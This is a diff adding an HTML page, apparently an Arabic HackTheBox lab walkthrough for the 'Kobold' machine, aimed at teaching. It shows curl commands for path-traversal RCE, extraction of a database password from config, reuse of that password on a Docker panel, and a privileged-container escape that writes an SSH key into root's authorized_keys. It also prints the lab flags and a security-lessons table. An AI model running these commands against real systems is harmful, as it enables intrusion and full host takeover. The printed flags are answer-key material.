+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة</div>
+        <pre>uid=<span class="num">65534</span>(nobody) gid=<span class="num">82</span>(www-data) groups=<span class="num">82</span>(www-data)
+<span class="ok"># السيرفر نفّذ أمر id ✅ عندنا RCE!</span></pre>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 كيف يعمل Path Traversal هنا؟</div>
+        <pre style="background:none;padding:0;color:#c9d1d9;">PrivateBin يقرأ template من:
+/privatebin-data/templates/ + [قيمة الـ cookie]
+
+نحن أرسلنا:  template=../data/pwn
+النتيجة:     /privatebin-data/templates/../data/pwn
+يُحلّ إلى:   /privatebin-data/data/pwn.php  ← ملفنا!</pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 7 ===== -->
+  <div class="stage s7">
+    <div class="stage-header">
+      <div class="stage-number">7</div>
+      <div>
+        <div class="stage-title">استخراج الـ Credentials</div>
+        <div class="stage-subtitle">قراءة ملفات Config الحساسة عبر RCE</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما الهدف من هذه الخطوة؟</div>
+        الآن عندنا قدرة تنفيذ أوامر كـ www-data على السيرفر.
+        نستخدم هذا لقراءة ملفات Config التي قد تحتوي على passwords يمكننا استخدامها للدخول على Arcane.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - استكشاف الملفات الموجودة:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-k</span> <span class="str">https://bin.kobold.htb/</span> \
+  <span class="flag">-b</span> <span class="str">"template=../data/pwn"</span> \
+  <span class="flag">-G</span> <span class="flag">--data-urlencode</span> <span class="str">"cmd=find /srv -type f"</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر - قراءة ملف الـ Config:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-k</span> <span class="str">https://bin.kobold.htb/</span> \
+  <span class="flag">-b</span> <span class="str">"template=../data/pwn"</span> \
+  <span class="flag">-G</span> <span class="flag">--data-urlencode</span> <span class="str">"cmd=cat /srv/cfg/conf.php"</span></pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة - Credentials مستخرجة</div>
+        <pre><span class="cmt"># MySQL Config - الأكتف</span>
+usr = <span class="str">"privatebin"</span>
+pwd = <span class="ok">"ComplexP@sswordAdmin1928"</span>   <span class="cmt">← الـ password الحقيقي</span>
+
+<span class="cmt"># PostgreSQL Config - قديم وغير مفعّل</span>
+;usr = <span class="str">"privatebin"</span>
+;pwd = <span class="err">"Z3r0P4ss"</span>   <span class="cmt">← قديم لا يعمل</span></pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🎯</span>
+        <strong>الـ Credentials:</strong><br/>
+        Username: <code>privatebin</code><br/>
+        Password: <code>ComplexP@sswordAdmin1928</code>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 لماذا وجدنا password قديم وجديد؟</div>
+        الملف يحتوي على عدة إعدادات لقواعد بيانات مختلفة (MySQL, PostgreSQL, SQLite).
+        السطور التي تبدأ بـ <code>;</code> هي تعليقات (comments) غير مفعّلة.
+        الـ password الأكتف هو في الإعداد الغير معلّق.
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 8 ===== -->
+  <div class="stage s8">
+    <div class="stage-header">
+      <div class="stage-number">8</div>
+      <div>
+        <div class="stage-title">تسجيل الدخول على Arcane</div>
+        <div class="stage-subtitle">Password Reuse - استخدام نفس كلمة المرور على خدمة أخرى</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو Arcane؟</div>
+        Arcane هو <strong>Docker Management Panel</strong> يعمل على port 3552.
+        واجهة ويب تسمح بإنشاء وإدارة Docker containers بالكامل من المتصفح.
+        الخطر: إذا دخلنا عليه كـ admin، نقدر نصنع containers بصلاحيات كاملة!
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">🔍 لماذا جربنا username = "arcane"؟</div>
+        الـ <a href="https://getarcane.app/docs/setup/installation" style="color:#58a6ff;">documentation الرسمية لـ Arcane</a> تقول بوضوح:
+        <br/><br/>
+        Default username: <code>arcane</code><br/>
+        Default password: <code>arcane-admin</code>
+        <br/><br/>
+        لكن الـ default password مُغيَّر — فجربنا كلمة MySQL التي وجدناها في الـ config.
+        هذا يُسمى <strong>Password Reuse</strong>: نفس الشخص استخدم نفس كلمة المرور لأكثر من خدمة.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - تسجيل الدخول عبر API:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-s</span> <span class="flag">-X</span> POST <span class="str">http://kobold.htb:3552/api/auth/login</span> \
+  <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="str">'{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'</span></pre>
+      </div>
+
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">-s</div>
+          <div class="part-desc">Silent mode - لا يعرض شريط التقدم، يعرض الـ output فقط</div>
+        </div>
+        <div class="part">
+          <div class="part-code">-X POST</div>
+          <div class="part-desc">نوع الـ request هو POST (إرسال بيانات)</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"username":"arcane"</div>
+          <div class="part-desc">اسم المستخدم الافتراضي لـ Arcane</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"password":"ComplexP@sswordAdmin1928"</div>
+          <div class="part-desc">كلمة MySQL التي استخرجناها من conf.php - password reuse!</div>
+        </div>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة - دخول ناجح!</div>
+        <pre>{
+  <span class="key">"success"</span>: <span class="ok">true</span>,
+  <span class="key">"data"</span>: {
+    <span class="key">"token"</span>: <span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhY2Nlc3MiLCJleHAiOjE3..."</span>
+  }
+}</pre>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 ما هو JWT Token هذا؟</div>
+        JWT (JSON Web Token) هو "تذكرة رقمية" مؤقتة تثبت هويتك للسيرفر.
+        بدلاً من إرسال username/password في كل request، ترسل هذا الـ token.
+        <br/><br/>
+        كل request بعدها يجب أن يحمل هذا الـ Header:<br/>
+        <code>Authorization: Bearer eyJhbGci...</code>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر - احفظ الـ Token في متغير:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="val">TOKEN</span>=$(<span class="cmd">curl</span> <span class="flag">-s</span> <span class="flag">-X</span> POST <span class="str">http://kobold.htb:3552/api/auth/login</span> \
+  <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="str">'{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'</span> \
+  | <span class="cmd">python3</span> <span class="flag">-c</span> <span class="str">"import sys,json; print(json.load(sys.stdin)['data']['token'])"</span>)
+
+<span class="cmd">echo</span> <span class="val">$TOKEN</span>   <span class="cmt"># تحقق أن الـ token محفوظ</span></pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🎯</span>
+        <strong>تسجيل الدخول نجح!</strong> الآن عندنا صلاحيات admin كاملة على Arcane.
+        الخطوة التالية: استكشاف ماذا يمكننا فعله.
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 9 ===== -->
+  <div class="stage s9">
+    <div class="stage-header">
+      <div class="stage-number">9</div>
+      <div>
+        <div class="stage-title">استكشاف Docker API</div>
+        <div class="stage-subtitle">اكتشاف الـ Endpoints المتاحة وبيئة Docker</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 لماذا نستكشف الـ API؟</div>
+        Arcane يحتوي على OpenAPI spec — وهو ملف JSON يوثق <strong>كل</strong> الـ endpoints المتاحة.
+        هذا يوفر علينا التخمين ويعطينا خريطة كاملة لكل ما يمكن فعله.
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - جلب OpenAPI Specification:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-s</span> <span class="str">http://kobold.htb:3552/api/openapi.json</span> \
+  <span class="flag">-H</span> <span class="str">"Authorization: Bearer $TOKEN"</span> \
+  | <span class="cmd">python3</span> <span class="flag">-c</span> \
+  <span class="str">"import sys,json; [print(m.upper()+' '+p) for p,v in json.load(sys.stdin)['paths'].items() for m in v]"</span></pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ أهم الـ Endpoints المكتشفة</div>
+        <pre><span class="cmt"># إدارة بيئات Docker</span>
+<span class="ok">GET</span>   /environments
+<span class="ok">GET</span>   /environments/{id}/system/docker/info
+
+<span class="cmt"># إدارة الـ Containers ← الخطير</span>
+<span class="ok">GET</span>   /environments/{id}/containers
+<span class="key">POST</span>  /environments/{id}/containers   <span class="cmt">← إنشاء container جديد!</span>
+<span class="ok">GET</span>   /environments/{id}/images
+
+<span class="cmt"># إدارة المستخدمين</span>
+<span class="ok">GET</span>   /users
+<span class="ok">GET</span>   /auth/me</pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر - فحص البيئات المتاحة:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-s</span> <span class="str">http://kobold.htb:3552/api/environments</span> \
+  <span class="flag">-H</span> <span class="str">"Authorization: Bearer $TOKEN"</span> | <span class="cmd">python3</span> <span class="flag">-m</span> json.tool</pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة - البيئة المكتشفة</div>
+        <pre>{
+  <span class="key">"data"</span>: [{
+    <span class="key">"id"</span>: <span class="str">"0"</span>,                  <span class="cmt">← هذا هو Environment ID</span>
+    <span class="key">"name"</span>: <span class="str">"Local Docker"</span>,    <span class="cmt">← Docker يعمل محلياً على السيرفر</span>
+    <span class="key">"status"</span>: <span class="ok">"online"</span>
+  }]
+}</pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الأمر - فحص الـ Images المتاحة:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-s</span> <span class="str">http://kobold.htb:3552/api/environments/0/images</span> \
+  <span class="flag">-H</span> <span class="str">"Authorization: Bearer $TOKEN"</span> | <span class="cmd">python3</span> <span class="flag">-m</span> json.tool</pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ النتيجة - Images موجودة مسبقاً</div>
+        <pre><span class="ok">mysql:latest</span>                          <span class="cmt">← سنستخدمها للـ exploit</span>
+privatebin/nginx-fpm-alpine:2.0.2     <span class="cmt">← image الـ PrivateBin</span></pre>
+      </div>
+
+      <div class="alert alert-info">
+        <span class="alert-icon">ℹ️</span>
+        <strong>لماذا mysql:latest مهمة؟</strong> لأنها image موجودة مسبقاً على السيرفر.
+        إنشاء container منها سيكون فوري بدون حاجة download — وهي توفر bash shell كافٍ لتنفيذ أوامرنا.
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 10 ===== -->
+  <div class="stage s10">
+    <div class="stage-header">
+      <div class="stage-number">10</div>
+      <div>
+        <div class="stage-title">Docker Escape - الهروب للـ Host</div>
+        <div class="stage-subtitle">Privileged Container + Bind Mount → SSH Key Injection</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما هو Docker Escape؟</div>
+        الـ Containers عادةً معزولة تماماً عن الـ Host (السيرفر الحقيقي).
+        لكن هناك استثناء خطير: إذا أنشأت container بـ <strong>privileged mode</strong>
+        وعملت <strong>bind mount</strong> لـ filesystem الـ Host،
+        فأنت في الحقيقة تتحكم في ملفات الـ Host مباشرة من داخل الـ Container.
+        <br/><br/>
+        هذا مثل وضع شاشة زجاجية بين سجين والعالم الخارجي، ثم جعل الزجاجة شفافة وقابلة للمرور — الحاجز لا يحجب شيئاً.
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 ما الفرق بين Container عادي و Privileged؟</div>
+        <pre style="background:none;padding:0;color:#c9d1d9;">Container عادي:
+  - معزول عن الـ Host
+  - لا يمكنه الوصول لـ devices الـ Host
+  - لا يمكنه تعديل kernel settings
+
+Container بـ privileged: true
+  - له نفس صلاحيات root على الـ Host
+  - يقدر يرى كل devices الـ Host
+  - يقدر يكتب على أي ملف في الـ Host عبر bind mount</pre>
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الخطوة 1 - توليد SSH Key Pair:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">ssh-keygen</span> <span class="flag">-t</span> rsa <span class="flag">-b</span> <span class="num">4096</span> <span class="flag">-f</span> pwn_key <span class="flag">-N</span> <span class="str">""</span>
+
+<span class="cmt"># -t rsa    → نوع التشفير RSA</span>
+<span class="cmt"># -b 4096   → طول المفتاح 4096 bit (آمن جداً)</span>
+<span class="cmt"># -f pwn_key → اسم الملف المُنتَج</span>
+<span class="cmt"># -N ""     → بدون passphrase (كلمة مرور على المفتاح)</span>
+
+<span class="cmt"># ينتج ملفين:</span>
+<span class="cmt"># pwn_key     ← المفتاح الخاص (نبقيه عندنا)</span>
+<span class="cmt"># pwn_key.pub ← المفتاح العام (نرسله للسيرفر)</span></pre>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 كيف يعمل نظام SSH Keys؟</div>
+        <pre style="background:none;padding:0;color:#c9d1d9;">المفتاح الخاص (private key):  يبقى عندك فقط - سري
+المفتاح العام  (public key):  يُوضع على السيرفر في ملف authorized_keys
+
+عند الاتصال:
+  أنت  →  "عندي المفتاح الخاص لهذا المفتاح العام"
+  السيرفر → يتحقق → يتطابق → ✅ ادخل بدون كلمة مرور</pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 2 - احفظ الـ Public Key في متغير:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="val">PUB</span>=$(<span class="cmd">cat</span> pwn_key.pub)
+<span class="cmd">echo</span> <span class="val">$PUB</span>
+
+<span class="cmt"># مثال على شكل المفتاح العام:</span>
+<span class="cmt"># ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... user@kali</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>الخطوة 3 - إنشاء Privileged Container عبر Arcane API:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">curl</span> <span class="flag">-s</span> <span class="flag">-X</span> POST <span class="str">http://kobold.htb:3552/api/environments/0/containers</span> \
+  <span class="flag">-H</span> <span class="str">"Authorization: Bearer $TOKEN"</span> \
+  <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+  <span class="flag">-d</span> <span class="str">"{
+    \"name\": \"pwn-escape\",
+    \"image\": \"mysql:latest\",
+    \"privileged\": true,
+    \"volumes\": [\"/:/host\"],
+    \"cmd\": [\"sh\",\"-c\",
+      \"mkdir -p /host/root/.ssh && echo '$PUB' >> /host/root/.ssh/authorized_keys && chmod 700 /host/root/.ssh && chmod 600 /host/root/.ssh/authorized_keys\"
+    ]
+  }"</span></pre>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>شرح كل حقل في الـ JSON:</strong></p>
+      <div class="parts">
+        <div class="part">
+          <div class="part-code">"name": "pwn-escape"</div>
+          <div class="part-desc">اسم الـ container - يمكن أي اسم</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"image": "mysql:latest"</div>
+          <div class="part-desc">الـ image المستخدمة - موجودة مسبقاً على السيرفر = لا يحتاج download</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"privileged": true</div>
+          <div class="part-desc">⚠️ المفتاح الخطير: يعطي الـ container صلاحيات root كاملة على الـ Host</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"volumes": ["/:/host"]</div>
+          <div class="part-desc">Mount كامل الـ Host filesystem داخل /host في الـ container — / على الـ Host = /host داخل الـ Container</div>
+        </div>
+        <div class="part">
+          <div class="part-code">"cmd": ["sh", "-c", "..."]</div>
+          <div class="part-desc">الأوامر التي تنفذ فور تشغيل الـ container</div>
+        </div>
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>شرح أوامر الـ cmd بالتفصيل:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>شرح - الـ cmd المُرسَل</span>text</div>
+        <pre><span class="cmd">mkdir</span> <span class="flag">-p</span> /host/root/.ssh
+<span class="cmt"># /host/root/.ssh داخل الـ container = /root/.ssh على الـ Host الحقيقي
+# -p يعني: أنشئ المجلدات الوسيطة إذا لم تكن موجودة، ولا تعطِ error إذا كانت موجودة</span>
+
+<span class="cmd">echo</span> <span class="str">'ssh-rsa AAAA...'</span> >> /host/root/.ssh/authorized_keys
+<span class="cmt"># >> تعني APPEND (أضف في النهاية) وليس > التي تمسح الملف وتكتب من جديد
+# هذا يضيف مفتاحنا العام في ملف SSH المعتمد للـ root</span>
+
+<span class="cmd">chmod</span> <span class="num">700</span> /host/root/.ssh
+<span class="cmt"># 700 = rwx------ : المالك فقط يقدر يقرأ/يكتب/يدخل المجلد
+# SSH يرفض العمل إذا كانت الصلاحيات أوسع من هذا!</span>
+
+<span class="cmd">chmod</span> <span class="num">600</span> /host/root/.ssh/authorized_keys
+<span class="cmt"># 600 = rw------- : المالك فقط يقدر يقرأ/يكتب الملف
+# SSH صارم جداً في التحقق من صلاحيات هذا الملف</span></pre>
+      </div>
+
+      <div class="alert alert-danger">
+        <span class="alert-icon">🚨</span>
+        <strong>لماذا chmod 700 و 600 ضروريان جداً؟</strong><br/>
+        SSH daemon يرفض تماماً استخدام authorized_keys إذا كانت الصلاحيات خاطئة.
+        إذا كان الملف قابلاً للكتابة من مستخدمين آخرين، يعتبره SSH خطراً أمنياً ويتجاهله.
+        بدون هذه الأوامر، لن يعمل الـ SSH login حتى لو كان المفتاح صحيحاً.
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ نتيجة إنشاء الـ Container</div>
+        <pre>{
+  <span class="key">"success"</span>: <span class="ok">true</span>,
+  <span class="key">"data"</span>: {
+    <span class="key">"id"</span>: <span class="str">"9c4100dfebf45fb1..."</span>,
+    <span class="key">"name"</span>: <span class="str">"/pwn-escape"</span>,
+    <span class="key">"status"</span>: <span class="ok">"running"</span>    <span class="cmt">← Container شغّل وأنهى مهمته ✅</span>
+  }
+}</pre>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 ماذا حدث بالضبط داخل الـ Container؟</div>
+        <pre style="background:none;padding:0;color:#c9d1d9;">Container يرى:               ←→   Host الحقيقي يرى:
+/host/root/.ssh/                    /root/.ssh/
+/host/root/.ssh/authorized_keys     /root/.ssh/authorized_keys
+                                           ↑
+                                   مفتاحنا العام هنا الآن!</pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== STAGE 11 ===== -->
+  <div class="stage s11">
+    <div class="stage-header">
+      <div class="stage-number">11</div>
+      <div>
+        <div class="stage-title">SSH كـ Root + الـ Flags 🏆</div>
+        <div class="stage-subtitle">الدخول النهائي كـ root واستخراج الـ Flags</div>
+      </div>
+    </div>
+    <div class="stage-body">
+
+      <div class="explain">
+        <div class="explain-title">🔍 ما الذي سيحدث عند الاتصال؟</div>
+        <pre style="background:none;padding:0;color:#c9d1d9;">1. نرسل private key لـ SSH
+2. SSH على الـ Host يفتح /root/.ssh/authorized_keys
+3. يجد مفتاحنا العام هناك (وضعناه في الخطوة السابقة)
+4. يتحقق أن private key يطابق public key ← يتطابق ✅
+5. يفتح session كـ root بدون كلمة مرور</pre>
+      </div>
+
+      <p style="margin-bottom:10px;"><strong>الأمر - الاتصال كـ Root:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Terminal - Kali</span>bash</div>
+        <pre><span class="cmd">ssh</span> <span class="flag">-i</span> pwn_key root@kobold.htb
+
+<span class="cmt"># -i pwn_key  → استخدم هذا الـ private key للمصادقة
+# root        → الـ user الذي نريد الدخول كـه
+# kobold.htb  → الـ hostname للسيرفر</span></pre>
+      </div>
+
+      <div class="result">
+        <div class="result-title">✅ 🎉 النتيجة - ROOT ACCESS!</div>
+        <pre><span class="ok">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-58-generic x86_64)</span>
+
+root@kobold:~# <span class="cmd">id</span>
+uid=<span class="num">0</span>(<span class="ok">root</span>) gid=<span class="num">0</span>(root) groups=<span class="num">0</span>(root)
+
+root@kobold:~# <span class="cmd">whoami</span>
+<span class="ok">root</span>
+
+root@kobold:~# <span class="cmd">hostname</span>
+kobold.htb</pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🎉</span>
+        <strong>نجحنا!</strong> عندنا shell كـ root — أعلى صلاحية ممكنة على Linux!
+      </div>
+
+      <p style="margin: 20px 0 10px;"><strong>قراءة الـ User Flag:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - root@kobold</span>bash</div>
+        <pre><span class="cmd">cat</span> /home/ben/user.txt
+
+<span class="cmt"># النتيجة:</span>
+<span class="ok flag-blur">8d6a4388f003e5d6152f99734c240522</span></pre>
+      </div>
+
+      <div class="explain">
+        <div class="explain-title">💡 لماذا user.txt عند ben وليس عندنا مباشرة؟</div>
+        المسار الطبيعي للمشين كان:
+        <br/><br/>
+        RCE → shell كـ ben (user.txt) → privilege escalation → root (root.txt)
+        <br/><br/>
+        نحن <strong>تخطينا خطوة بن</strong> ودخلنا مباشرة كـ root عبر Docker escape.
+        لكن بما أننا root، نقدر نقرأ أي ملف على النظام بما فيه user.txt الخاص بـ ben.
+      </div>
+
+      <p style="margin: 16px 0 10px;"><strong>قراءة الـ Root Flag:</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - root@kobold</span>bash</div>
+        <pre><span class="cmd">cat</span> /root/root.txt
+
+<span class="cmt"># النتيجة:</span>
+<span class="ok flag-blur">ad667f862168c1a5ca9388cab9b3045f</span></pre>
+      </div>
+
+      <div class="alert alert-success">
+        <span class="alert-icon">🏆</span>
+        <strong>Machine Pwned!</strong><br/>
+        User Flag: <code class="flag-blur">8d6a4388f003e5d6152f99734c240522</code><br/>
+        Root Flag: <code class="flag-blur">ad667f862168c1a5ca9388cab9b3045f</code>
+      </div>
+
+      <hr class="divider" />
+
+      <p style="margin-bottom: 14px;"><strong>استكشاف إضافي بعد الـ Root (Post-Exploitation):</strong></p>
+      <div class="code-block">
+        <div class="code-label"><span>Shell - root@kobold</span>bash</div>
+        <pre><span class="cmt"># المستخدمون على النظام</span>
+root@kobold:~# <span class="cmd">cat</span> /etc/passwd | <span class="cmd">grep</span> -v nologin
+root:x:0:0:root:/root:/bin/bash
+ben:x:1001:1001::/home/ben:/bin/bash
+alice:x:1002:1002::/home/alice:/bin/bash
+
+<span class="cmt"># ما يعمل على النظام</span>
+root@kobold:~# <span class="cmd">docker</span> ps
+CONTAINER ID  IMAGE                          NAMES
+4c49dd7bb727  privatebin/nginx-fpm-alpine    /bin    <span class="cmt">← PrivateBin</span>
+9c4100dfebf4  mysql:latest                   /pwn-escape  <span class="cmt">← containerنا</span>
+
+<span class="cmt"># ملاحظة: alice ليس عندها user.txt - ليست مستخدمة في هذا المسار</span></pre>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== FINAL CHAIN ===== -->
+  <div class="chain">
+    <h2>🔗 سلسلة الاستغلال الكاملة من الصفر للـ Root</h2>
+    <div class="flow">
+      <div class="flow-box">1️⃣ nmap → ports 22, 80(HTTPS), 443, 3552(Arcane)</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">2️⃣ ffuf vhost scan → mcp.kobold.htb + bin.kobold.htb</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">3️⃣ CVE-2026-23744: POST /api/mcp/connect بدون auth</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">4️⃣ Reverse Shell → shell كـ ben (user.txt اختياري هنا)</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">5️⃣ ben في مجموعة operator → write access على /privatebin-data/data/</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">6️⃣ كتابة pwn.php + Path Traversal cookie → RCE كـ www-data</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">7️⃣ RCE: قراءة /srv/cfg/conf.php → ComplexP@sswordAdmin1928</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">8️⃣ Password Reuse: arcane:ComplexP@sswordAdmin1928 → Arcane admin ✅</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">9️⃣ Arcane API: اكتشاف Docker environment ID=0 + image mysql:latest</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box">🔟 POST /api/environments/0/containers → privileged:true + /:/host → SSH key injection</div>
+      <div class="flow-arrow">↓</div>
+      <div class="flow-box" style="border-color:#3fb950;background:#1a2b1a;">1️⃣1️⃣ ssh -i pwn_key root@kobold.htb → uid=0(root) 🏆</div>
+    </div>
+  </div>
+
+  <!-- ===== LESSONS ===== -->
+  <div class="info-table">
+    <h2>📚 الدروس المستفادة - Security Takeaways</h2>
+    <table>
+      <tr><th>الثغرة / الخطأ</th><th>السبب</th><th>الحل الصحيح</th></tr>
+      <tr>
+        <td>CVE-2026-23744 - Unauthenticated RCE</td>
+        <td>API endpoint يقبل أوامر بدون تحقق من الهوية</td>
+        <td>إلزامية المصادقة على كل الـ endpoints الحساسة</td>
+      </tr>
+      <tr>
+        <td>Password Reuse</td>
+        <td>نفس كلمة المرور لـ MySQL وـ Arcane admin</td>
+        <td>كلمة مرور مختلفة وقوية لكل خدمة + Password Manager</td>
+      </tr>
+      <tr>
+        <td>معلومات حساسة في Config مكشوف</td>
+        <td>conf.php يمكن قراءته عبر RCE</td>
+        <td>تشفير كلمات المرور في الـ config + تقييد الصلاحيات</td>
+      </tr>
+      <tr>
+        <td>Docker بدون قيود</td>
+        <td>Arcane يسمح بإنشاء privileged containers</td>
+        <td>تعطيل privileged containers + Docker socket proxy</td>
+      </tr>
+      <tr>
+        <td>Path Traversal في PrivateBin</td>
+        <td>cookie template غير محكومة</td>
+        <td>Sanitize كل user input + whitelist القيم المسموحة</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- ===== FOOTER ===== -->
+  <div class="footer">
+    <p>HackTheBox - Kobold Machine | شرح تعليمي لأغراض التعلم فقط</p>
+    <p style="margin-top:6px;">CVE-2026-23744 | Linux | Easy</p>
+  </div>
+
+</div>
+<script>
+document.querySelectorAll('.flag-blur').forEach(function(el) {
+  el.title = 'انقر للكشف عن الـ Flag';
+  el.addEventListener('click', function() {
+    this.classList.toggle('revealed');
+  });
+});
+</script>
+</body>
+</html>
